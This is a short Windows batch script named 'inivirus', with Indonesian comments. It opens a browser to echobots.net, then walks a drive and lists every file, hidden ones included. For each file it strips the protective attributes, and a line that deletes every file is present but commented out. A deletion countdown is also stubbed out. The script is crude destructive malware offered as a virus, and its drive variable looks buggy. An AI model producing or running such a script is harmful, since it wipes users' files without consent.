@echo off  :: ini hidden yang D:\\ itu
cls :: ini clean

title inivirus :: ini judul atas

start chrome https://echobots.net
:: shell:startup

::Echo. 30 detik menuju penghapusan file

::SLEEP 30

goto :Drive :: dia pergi ke menu Drive

:Drive :: ini menu drive
Cd /d "%E%" :: arah ke E
Call :Scan :: setelah yang atas di run dia manggil menu scan

:Scan :: ini menu scan
dir /s /b * >"A.txt" :: ini buat file A.txt
dir /s /b * /a:h>>"A.txt"

for /f "tokens=*" %%A in (a.txt) do ( :: ini perulangan nyari setiap file nya
	attrib -r -s -a -h "%%A"
	:: del /q "%%A" :: ini delete file yang di temui
	)
goto :EOF :: ini end